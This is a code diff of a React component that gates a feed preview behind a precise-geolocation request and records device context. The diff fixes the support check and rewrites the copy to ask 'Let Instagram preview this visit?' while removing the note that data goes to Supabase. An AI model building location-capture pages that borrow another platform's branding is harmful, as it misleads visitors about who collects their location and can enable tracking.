@@ -6,19 +6,11 @@ import {
   Loader2,
   LocateFixed,
   MapPinned,
-  ShieldCheck,
 } from "lucide-react"
 
 import { FeedSkeleton } from "@/components/skeletons"
-import { Badge } from "@/components/ui/badge"
 import { Button } from "@/components/ui/button"
-import {
-  Card,
-  CardContent,
-  CardDescription,
-  CardHeader,
-  CardTitle,
-} from "@/components/ui/card"
+import { Card, CardContent } from "@/components/ui/card"
 import type { ConsentStatus, SessionIngestPayload } from "@/lib/visitor-sessions"
 
 type GateStatus = "idle" | "requesting-location" | "saving-session"
@@ -54,7 +46,7 @@ function getCurrentPosition() {
   return new Promise<GeolocationPosition>((resolve, reject) => {
     navigator.geolocation.getCurrentPosition(resolve, reject, {
       enableHighAccuracy: true,
-      timeout: 5000,
+      timeout: 15000,
       maximumAge: 0,
     })
   })
@@ -89,13 +81,22 @@ export function VisitorSessionGate({
   const [errorMessage, setErrorMessage] = useState<string | null>(null)
   const hasUnlockedRef = useRef(false)
   const isMountedRef = useRef(true)
-  const geolocationSupported =
-    typeof navigator !== "undefined" && "geolocation" in navigator
+  const [geolocationSupported, setGeolocationSupported] = useState<
+    boolean | null
+  >(null)
 
   useEffect(() => {
     return () => {
       isMountedRef.current = false
     }
+  }, [])
+
+  useEffect(() => {
+    if (typeof navigator === "undefined") {
+      return
+    }
+
+    setGeolocationSupported("geolocation" in navigator)
   }, [])
 
   const unlock = () => {
@@ -158,6 +159,13 @@ export function VisitorSessionGate({
   }
 
   const handlePreciseLocation = async () => {
+    if (geolocationSupported == null) {
+      if (isMountedRef.current) {
+        setErrorMessage("Checking whether precise location is available. Please try again.")
+      }
+      return
+    }
+
     if (!geolocationSupported) {
       void submitSession("unsupported")
       return
@@ -197,6 +205,13 @@ export function VisitorSessionGate({
   }
 
   const handleContinueWithoutLocation = () => {
+    if (geolocationSupported == null) {
+      if (isMountedRef.current) {
+        setErrorMessage("Checking whether precise location is available. Please wait a moment.")
+      }
+      return
+    }
+
     if (isMountedRef.current) {
       setErrorMessage(null)
     }
@@ -204,60 +219,45 @@ export function VisitorSessionGate({
   }
 
   const isBusy = status !== "idle"
+  const isCheckingGeolocation = geolocationSupported == null
 
   return (
     <div className="relative">
       <FeedSkeleton />
 
-      <div className="pointer-events-none absolute inset-x-0 top-0 flex min-h-[70vh] items-center justify-center px-4 py-10">
-        <Card className="pointer-events-auto w-full max-w-xl border-border/60 bg-background/96 shadow-[0_24px_80px_rgba(15,23,42,0.14)] backdrop-blur">
-          <CardHeader className="space-y-4">
-            <div className="flex items-center justify-between gap-3">
-              <Badge
-                variant="outline"
-                className="rounded-full border-emerald-200 bg-emerald-50 px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.22em] text-emerald-700"
-              >
-                Session capture
-              </Badge>
-              <div className="flex items-center gap-2 text-xs text-muted-foreground">
-                <ShieldCheck className="h-4 w-4" />
-                Consent required
-              </div>
+      <div className="pointer-events-none absolute inset-x-0 top-0 flex min-h-[70vh] items-start justify-center px-4 pt-20 md:pt-12">
+        <Card className="pointer-events-auto w-full max-w-[470px] rounded-2xl border-border bg-background shadow-[0_12px_40px_rgba(0,0,0,0.08)]">
+          <CardContent className="space-y-5 p-5 sm:p-6">
+            <div className="space-y-2 text-center">
+              <p className="text-xs font-semibold uppercase tracking-[0.18em] text-muted-foreground">
+                Before you continue
+              </p>
+              <h1 className="text-xl font-semibold tracking-tight text-foreground">
+                Let Instagram preview this visit?
+              </h1>
+              <p className="text-sm leading-6 text-muted-foreground">
+                Allowing precise location stores a one-time coordinate together with
+                basic device context for this demo. You can keep browsing without it.
+              </p>
             </div>
 
-            <div className="space-y-2">
-              <CardTitle className="text-2xl tracking-tight">
-                Confirm your visit before the preview opens.
-              </CardTitle>
-              <CardDescription className="max-w-lg text-sm leading-6">
-                If you allow precise location, this demo stores a high-accuracy
-                coordinate plus limited device context in Supabase. You can also
-                continue without precise location.
-              </CardDescription>
-            </div>
-          </CardHeader>
-
-          <CardContent className="space-y-5">
-            <div className="grid gap-3 sm:grid-cols-3">
-              <div className="rounded-2xl border border-border/70 bg-muted/40 p-4">
+            <div className="grid gap-3 sm:grid-cols-2">
+              <div className="rounded-2xl border border-border bg-muted/30 p-4">
                 <MapPinned className="h-5 w-5 text-foreground" />
-                <p className="mt-3 text-sm font-medium">Precise coordinate</p>
+                <p className="mt-3 text-sm font-medium text-foreground">
+                  Precise only when you allow it
+                </p>
                 <p className="mt-1 text-xs leading-5 text-muted-foreground">
-                  Requested only after you choose the primary action.
+                  Location is requested only after you tap the primary action.
                 </p>
               </div>
-              <div className="rounded-2xl border border-border/70 bg-muted/40 p-4">
-                <ShieldCheck className="h-5 w-5 text-foreground" />
-                <p className="mt-3 text-sm font-medium">Thai-law friendly</p>
-                <p className="mt-1 text-xs leading-5 text-muted-foreground">
-                  Limited telemetry, no persistent fingerprinting, no hidden collection.
-                </p>
-              </div>
-              <div className="rounded-2xl border border-border/70 bg-muted/40 p-4">
+              <div className="rounded-2xl border border-border bg-muted/30 p-4">
                 <LocateFixed className="h-5 w-5 text-foreground" />
-                <p className="mt-3 text-sm font-medium">Fallback path</p>
+                <p className="mt-3 text-sm font-medium text-foreground">
+                  Browsing still works without it
+                </p>
                 <p className="mt-1 text-xs leading-5 text-muted-foreground">
-                  If location is unavailable, the preview still unlocks and the session is marked accordingly.
+                  If location is unavailable, the feed still opens and consent is recorded.
                 </p>
               </div>
             </div>
@@ -276,14 +276,16 @@ export function VisitorSessionGate({
                 onClick={() => {
                   void handlePreciseLocation()
                 }}
-                disabled={isBusy}
+                disabled={isBusy || isCheckingGeolocation}
               >
                 {status === "requesting-location" || status === "saving-session" ? (
                   <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                 ) : (
                   <LocateFixed className="mr-2 h-4 w-4" />
                 )}
-                {geolocationSupported
+                {isCheckingGeolocation
+                  ? "Checking location support"
+                  : geolocationSupported
                   ? "Allow precise location"
                   : "Continue with limited session data"}
               </Button>
@@ -293,16 +295,16 @@ export function VisitorSessionGate({
                 variant="outline"
                 className="rounded-full"
                 onClick={handleContinueWithoutLocation}
-                disabled={isBusy}
+                disabled={isBusy || isCheckingGeolocation}
               >
-                Continue without precise location
+                Continue without location
               </Button>
             </div>
 
-            <p className="text-xs leading-5 text-muted-foreground">
-              Captured fields: consent outcome, timestamp, locale, timezone,
-              viewport, screen size, referrer, coarse network location headers,
-              and browser summary.
+            <p className="text-center text-xs leading-5 text-muted-foreground">
+              Saved fields include consent outcome, timestamp, locale, timezone,
+              viewport, screen size, referrer, browser summary, and coarse
+              network location headers.
             </p>
           </CardContent>
         </Card>
